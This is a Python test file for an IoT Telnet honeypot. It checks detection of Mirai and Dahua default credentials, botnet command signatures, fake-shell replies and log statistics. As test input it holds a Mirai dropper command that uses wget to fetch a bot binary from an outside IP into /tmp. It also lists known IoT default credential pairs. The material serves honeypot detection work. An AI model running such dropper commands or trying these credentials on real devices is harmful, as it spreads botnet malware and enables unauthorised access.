"""
Automated Unit and Integration Tests for IoT Telnet Honeypot.
Can be executed with:
    python tests/test_honeypot.py
or
    pytest
"""

import sys
import os
import unittest
from pathlib import Path

# Add project root to sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from honeypot.signatures import analyze_credential, analyze_command
from honeypot.shell_emulator import ShellEmulator
from honeypot.logger import HoneypotLogger
from analyzer import LogAnalyzer

class TestIoTHoneypot(unittest.TestCase):
    def setUp(self):
        self.emulator = ShellEmulator()

    def test_known_iot_credentials(self):
        """Test identification of known Mirai and IoT default credentials."""
        mirai_cred = analyze_credential("root", "xc3511")
        self.assertTrue(mirai_cred["is_known_iot"])
        self.assertIn("Mirai", mirai_cred["signature"])
        self.assertEqual(mirai_cred["threat_level"], "HIGH")

        dahua_cred = analyze_credential("root", "888888")
        self.assertTrue(dahua_cred["is_known_iot"])
        self.assertIn("Dahua", dahua_cred["signature"])

        random_cred = analyze_credential("alice", "P@ssw0rd999!")
        self.assertFalse(random_cred["is_known_iot"])

    def test_botnet_command_signatures(self):
        """Test signature detection on typical botnet shell commands."""
        # Mirai shell escape
        res1 = analyze_command("enable")
        self.assertEqual(res1["highest_severity"], "HIGH")
        self.assertEqual(res1["matches"][0]["botnet"], "Mirai / Gafgyt")

        # Dropper detection and URL extraction
        res2 = analyze_command("wget http://185.156.73.12/bins/mirai.mips -O /tmp/bot")
        self.assertEqual(res2["highest_severity"], "CRITICAL")
        self.assertIn("http://185.156.73.12/bins/mirai.mips", res2["extracted_urls"])

        # Mount point probing
        res3 = analyze_command("/bin/busybox cat /proc/mounts")
        self.assertEqual(res3["highest_severity"], "MEDIUM")

        # Reconnaissance
        res4 = analyze_command("uname -a")
        self.assertEqual(res4["highest_severity"], "LOW")

    def test_shell_emulation(self):
        """Verify fake shell responses simulate an embedded MIPS/ARM environment."""
        # Mounts
        out, should_exit = self.emulator.execute("cat /proc/mounts")
        self.assertIn("ramfs /tmp ramfs rw", out)
        self.assertFalse(should_exit)

        # CPU Info
        out, _ = self.emulator.execute("cat /proc/cpuinfo")
        self.assertIn("MIPS 74Kc", out)

        # Uname
        out, _ = self.emulator.execute("uname -a")
        self.assertIn("Linux router", out)

        # Exit command
        out, should_exit = self.emulator.execute("exit")
        self.assertTrue(should_exit)

    def test_log_analyzer_metrics(self):
        """Verify LogAnalyzer calculates summaries correctly from SQLite."""
        analyzer = LogAnalyzer()
        stats = analyzer.get_summary_statistics()
        self.assertGreaterEqual(stats["total_sessions"], 1)
        self.assertGreaterEqual(stats["total_commands"], 1)

if __name__ == "__main__":
    unittest.main()
